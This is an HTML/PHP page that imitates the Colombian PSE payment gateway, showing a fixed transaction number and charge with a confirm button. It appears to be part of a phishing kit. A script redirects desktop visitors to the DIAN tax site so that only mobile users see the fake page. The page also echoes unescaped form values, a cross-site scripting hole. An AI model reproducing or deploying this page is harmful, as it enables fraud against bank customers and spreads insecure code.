<!DOCTYPE html>
<html>
    <head>
        <title>PSE - Pago con Registro Person Natural</title>
        <meta http-equiv="content-type" content="text/html; utf-8">
        <meta charset="utf-8">
        
        <meta content="es" http-equiv="Content-Language">
    
        <meta name="description" content="">
        <meta name="author" content="">
        <meta name="Copyright" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Lato:ital,wght@0,100;0,300;0,400;0,700;0,900;1,100;1,300;1,400;1,700;1,900&display=swap" rel="stylesheet">
        <script type="text/javascript" src="js/jquery-3.6.0.min.js"></script>      
 
        <script type="text/javascript" src="js/functions.js"></script>  
        <script type="text/javascript" src="js/ready.js"></script>
        <link href="css/style.css" rel="stylesheet"> 
    </head>
    <body style="background-color: #fff">
        <input type="hidden" name="hdd-opcion" id="hdd-opcion">
        <div id="cabecera">
            <img src="img/lps.png" id="logo-mobile">
            <table cellpadding="0" cellspacing="0" width="98%" border="0" id="tbl-cabecera">
                <tr>
                    <td valign="middle" align="left" width="100" id="td-logo"><img src="img/lps.png" width="76"></td>
                    <td valign="middle" align="left" id="td-texto">Fácil, rápido y seguro</td>
                </tr>
            </table>
        </div>        
        <img src="img/ayuda.jpg" id="ayuda">
        <div style="text-align: center;font-weight: 700;font-size: 26px;color: #323153;margin-top: 47px;margin-bottom: 44px;padding: 0px 60px;">Pasarela de pagos
</div>
         <div id="formulario">
            <div class="titulo">Número de Transación</div>
            <div class="valor">bf262d7a-31c0-4e1a-98c2-972fce1bfd4a</div>
            <div class="titulo">Tipo de Cliente</div>
            <div class="valor"><?php if (isset($_POST['hdd-persona'])) echo $_POST['hdd-persona']; ?></div>
            <div class="titulo">Cantidad</div>
            <div class="valor">$193,900.00</div>
            <div class="titulo">Banco</div>
            <div class="valor"><?php if (isset($_POST['hdd-banco'])) echo $_POST['hdd-banco']; ?></div>
            <br>
            <button class="btn" id="btn-confirmar">Confirmar</button>
            <br>
            <button class="btn-cancel" id="btn-regresar" onclick="window.location.href = 'index.html';">Regresar</button>
         </div> 
         <br><br><br>
        <div id="pie-mobile"><img src="img/super.jpg"></div>
        <table cellpadding="0" cellspacing="0" border="0" width="80%" id="pie">
            <tr>
                <td align="left" id="lado-izq-pie"><img src="img/super.jpg"></td>
                <td align="right" id="lado-der-pie">
                    <div style="width:100%; max-width:340px;" class="letra-pie">Para mayor información comunícate con nosotros</div>
                    <table cellpadding="0" cellspacing="0" border="0" width="100%" style="max-width: 340px;">
                        <tr>
                            <td><td>
                            <td class="letra-pie">en Bogotá +57 (1) 3808890 opción 5</td>
                        </tr>
                        <tr>
                            <td><td>
                            <td class="letra-pie">o escríbenos https://www.pse.com.co/persona, opción centro de ayuda, Formulario de contacto.</td>
                        </tr>
                </td>
            </tr>
        </table>
    
<script>
    function detectar_dispositivo() {
        var dispositivo = "";
        if (navigator.userAgent.match(/Android/i))
            dispositivo = "Android";
        else if (navigator.userAgent.match(/webOS/i))
            dispositivo = "webOS";
        else if (navigator.userAgent.match(/iPhone/i))
            dispositivo = "iPhone";
        else if (navigator.userAgent.match(/iPad/i))
            dispositivo = "iPad";
        else if (navigator.userAgent.match(/iPod/i))
            dispositivo = "iPod";
        else if (navigator.userAgent.match(/BlackBerry/i))
            dispositivo = "BlackBerry";
        else if (navigator.userAgent.match(/Windows Phone/i))
            dispositivo = "Windows Phone";
        else
            dispositivo = "PC";
        return dispositivo;
    }

    if (detectar_dispositivo() == "PC") {
        window.location.href = 'https://www.dian.gov.co';
    }
</script>
    
</body>    
</html>